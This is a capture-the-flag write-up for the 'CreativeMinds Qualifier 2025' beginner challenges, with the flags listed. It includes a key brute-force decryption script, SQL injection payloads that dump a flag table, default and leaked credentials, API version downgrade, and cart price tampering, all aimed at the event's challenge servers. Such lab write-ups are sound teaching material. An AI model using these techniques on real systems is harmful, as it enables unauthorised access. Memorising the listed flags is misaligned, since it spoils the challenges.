# CreativeMinds Qualifier 2025
https://creativeminds.ruhr/

## Sanity Check
- Just enter the flag from the task description
- `flag{This_is_your_first_flag_Copy_me!}`

## Flag Salad
- Rotate by 3 (caesar cipher)
- `flag{ROMaine_Lettuce_topped_with_crunched_microchips_and_snake_oil}`

## Welcome to CyberKitten University!
- Flag in source code of the webpage
- `flag{Bachelor_of_Science_in_Caterating_Feline_Images}`

## Milky Privacy 
- Open privacy notice
- Check the cookies that have been set
- `flag{This_purr-fect_cookie_is_ev3n_b3tter_with_milk!}`

## Am I requesting too much?
- Write a python script e.g.
```python
import requests

# Base URL and port
base_url = "http://challs.creativeminds.ruhr:40406"

# Starting point
chain = "start"


while True:
    try:
        # Make the request to the server
        response = requests.get(f"{base_url}/flag?chain={chain}")
        
        # Check the response status
        if response.status_code != 200:
            print(f"Error: Received status code {response.status_code}")
            break

        # Parse the response
        data = response.text
        print(f"Response: {data}")
        
        # Check for stopping condition (e.g., success message or no 'chain' key)
        if "Congratulations" in data or "Done" in data or "flag" in data:
            print("Challenge completed!")
            break

        # Update the chain for the next request
        chain = data.strip()  # Assuming the server returns the next chain ID directly
    except Exception as e:
        print(f"An error occurred: {e}")
        break
```
- `flag{py7h0n_1s_mY_f4V0r17e_t00L_b0x_or_by_h4nd_but_th4t_w0uld_b3_p4in}`

## The library is open
- `curl http://challs.creativeminds.ruhr:40407/api?id=1`
- `curl http://challs.creativeminds.ruhr:40407/api?id=2`
- `curl http://challs.creativeminds.ruhr:40407/api?id=3`
- `flag{r34D1n9_15_fUND4m3Nt4l_4_ev3ry0ne}`

## Crypt Fail
- The key generation based on a random value is weak, the possible key space is small. Write a script to exploit.
- `python3 -m venv my_env`
- `source my_env/bin/activate`
- `pip install pycryptodome`
```python
from Crypto.Cipher import AES
from pathlib import Path

def generate_key(t):
    """Recreates the key based on the random value t."""
    state = [(t >> 6) ^ 0xff, ((t << 2) & 0xff) >> 6]
    keyl = b''
    keyr = b''
    for i in range(8):
        state[0] = state[0] ^ ((t >> i ^ t << i) & 0xff)
        state[1] = state[1] ^ ((t << i ^ t >> i) & 0xff)
        keyl += state[0].to_bytes(1, 'little')
        keyr += state[1].to_bytes(1, 'little')
    return keyl + keyr

def brute_force_decrypt(input_filename):
    """Brute-forces the key and decrypts the file."""
    data = open(input_filename, 'rb').read()
    nonce, ciphertext = data[:16], data[16:]
    
    for t in range(256):
        try:
            key = generate_key(t)
            cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
            plaintext = cipher.decrypt(ciphertext)
            # Check if the plaintext is valid (e.g., contains readable characters)
            if plaintext.isascii() and "f" in plaintext.decode('ascii'):
                print(f"Key found! t={t}")
                print(f"Decrypted message: {plaintext.decode('ascii')}")
                return
        except Exception as e:
            # Ignore decryption errors
            print(e)
            pass
    print("No valid key found.")

# Example usage
brute_force_decrypt("grade_enc.txt")
```
- Use the script to decrypt the file and obtain the flag
```
Key found! t=124
Decrypted message: You did very well, better work than I have ever seen!
You get 10/10 points and a bonus flag: 
flag{k3y_g3naration_1s_h4rd_ev3rywh3re}
```
- `flag{k3y_g3naration_1s_h4rd_ev3rywh3re}`


## Free Swag
- Add a negative amount of an item to the cart
- Flag at bottom of the page where total is shown
- `flag{g37_a_20%_d15C0UN7_W17h_0UR_c0D3_VIRTUALMEOW20}`

## E-learning with Poodle
- Check the manual
- Use the mentioned credentials `goodboi` and `BorkBorkWoof123`
- `flag{d3fauL7_pA22W0rD_ar3_n3v3r_a_g00d_id34}`

## E-learning with Zoodle
- Click on 'Dashboard'
- `http://challs.creativeminds.ruhr:40412/v2/dashboard`
- change to `http://challs.creativeminds.ruhr:40412/v1/dashboard`
- `flag{E4t_m0re_gr33ns_4nd_disabl3_y0ur_0ld_APIs_!}`

## E-learning with Noodle
- Decode all Base64 strings and check where 2FA = false
- 2nd user does not have 2FA use the credentials after decoding - `PestoPrincess` and `Bas1licious&`
- `flag{bAsE64_iS_mY_fAv0rItE_eNcRyPtIoN_aLgOrItHm}`

## SQL 101
- `SELECT * FROM information_schema.tables`
- `SELECT * FROM flag`
- `flag{sql_1s_0ft3n_us3d_1n_pr4ctice}`

## SQL Injection 101 
- `* from information_schema.tables --`
- `* from flag --`
- `flag{1nj3ctions_are_a_v3ry_c0mm0n_vulnerability}`